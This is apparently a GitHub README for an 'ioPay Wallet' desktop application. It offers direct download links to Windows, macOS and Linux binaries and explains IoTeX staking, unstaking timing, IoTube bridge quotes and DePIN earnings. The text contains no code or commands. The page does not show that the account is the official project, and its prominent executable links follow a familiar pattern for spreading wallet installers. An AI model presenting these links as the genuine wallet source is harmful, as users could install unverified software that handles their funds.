![ioPay Wallet](assets/banner-profile.png)

<h1 align="center">ioPay Wallet</h1>

<p align="center"><em>Holding IOTX is the beginning; staking it, moving it across chains and reading what it earns is the rest of the job.</em></p>

<p align="center"><a href="#license"><img src="https://img.shields.io/badge/LICENSE-Apache--2.0-0969da?style=for-the-badge&labelColor=0B1733" alt="License: Apache-2.0"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2"><img src="https://img.shields.io/badge/RELEASE-v2.0.2-0969da?style=for-the-badge&labelColor=0B1733" alt="Release: v2.0.2"></a></p>

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

Download links and the release history are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2).

> **Stakes and bridges are signed locally.** Get the application from the release page above and nowhere else.

## Why ioPay Wallet

On IoTeX, a balance that sits still is doing less than it could. Staking delegates IOTX to a validator for a duration you choose, rewards accumulate against that position, and the unstaking countdown is a separate clock from the withdrawal that follows it. ioPay Wallet puts that entire sequence in one desktop application, so the reader who wants to stake is not sent to a website to paste a key, and the reader who wants to move value across chains is not asked to trust a browser tab with a phrase.

The bridge side is where most of the risk sits. IoTube moves assets between IoTeX, Ethereum, BSC and Polygon, and every route quotes two gas costs because two chains are involved. The wallet shows the quote before the transfer, tracks the status afterwards, and lets the reader compare a bridge against an exchange transfer rather than assuming one is cheaper. That comparison is the useful part: the answer changes with the amount, the destination and the congestion on both chains.

- **Staking with a validator comparison.** APY, uptime and commission for each validator, with delegation from the same screen.
- **Rewards that compound.** Re-staking is one action, and the projection takes an amount you enter rather than a headline rate.
- **The unstaking gap, made visible.** Turning stake-lock off starts a countdown; withdrawing is a second action about three days later.
- **DePIN income in the same place.** Device earnings, burn-drop allocations per staking bucket and ioID registration sit alongside the staking position they attach to.

## What the value side looks like?

A staking position is a bucket with an identifier, not a line in a balance. The minimum is 100 IOTX, durations run up to 1050 days in seven-day steps, and the tokens returned on withdrawal are the staked amount plus rewards rather than the vote weight shown beside a validator. Readers lose time on that last distinction: a stake of seventy thousand IOTX can display a larger vote number, and the vote number is not what comes back.

Bridging has its own vocabulary. The February 2026 IoTube incident involved unauthorised CIOTX minting; IoTeX opened a claims portal in March and governance passed IIP-56 to retire the token. The guides treat that as a dated event with a claims route, not as a general warning about bridges, and they do not claim that every affected user was paid. Swap slippage is a separate setting in the same application, and the guide explains when a failed swap is the setting rather than the route.

## Reading a bridge quote

A bridge quote contains more than a fee. It names the source chain and the destination chain, the asset being moved, the amount that will arrive, and the gas the wallet expects to pay on each side. Two numbers rather than one is not a markup; it is the cost of touching two networks. A comparison against an exchange withdrawal is only meaningful when the exchange fee, the withdrawal minimum and the network the exchange uses are all in the same comparison.

The quote is also a moment in time. Congestion on either chain changes the gas estimate, and a route that was cheap an hour ago can be expensive now. The wallet shows the estimate it will use before you confirm, and the status tracker afterwards shows which leg has completed. If a transfer sits between legs, the useful question is which chain has acknowledged it, not whether the wallet is broken.

Slippage belongs to the swap, not the bridge, and the two are easy to conflate when a transfer produces an unexpected amount. A swap sets a tolerance for price movement; a bridge moves an asset across chains. When a trade fails, the setting is one candidate and the route is another, and the slippage page explains how to tell them apart before changing a number that only makes the failure less likely to be reported.

## Guides for this part of the wallet

| Guide | What it answers |
|---|---|
| [How to Stake IOTX in ioPay Wallet](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) | Delegation, the duration steps, and what a staking bucket actually means here. |
| [Best IoTeX Validator for ioPay Staking](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/best-iotex-validator-for-iopay-staking.md) | How to compare validators on evidence rather than on a leaderboard ranking. |
| [IoTeX Unstaking Period Explained](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md) | Why unstaking and withdrawing are two separate actions about three days apart. |
| [How to Use the IoTube Bridge](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-use-the-iotube-bridge-in-iopay-wallet.md) | The route, the two gas costs on each side and the status tracker. |
| [ioPay DePIN Earnings Dashboard](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-depin-earnings-dashboard-explained.md) | How device income is grouped per device and what the earnings calculator uses. |

This repository is one of the account's entry points for ioPay Wallet; the application on this page is the product, and the staking and bridge guides carry the operating detail.

## Security

**Staking and bridging are signed on your machine; no validator, bridge or support page ever needs the recovery phrase to complete either action.**

## Support

There is no public issue tracker on these repositories and no support desk holding credentials. The [help guide](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-to-get-help-with-iopay-wallet.md) explains where questions are answered and which offers to refuse.

## License

Apache-2.0, matching the ioPay Wallet project's own licence.

---

[Wallet repository](https://github.com/iopay-project/iopay-desktop-wallet) - [v2.0.2 release](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2) - [All guides](https://github.com/iopay-project/desktop-setup-and-safety)
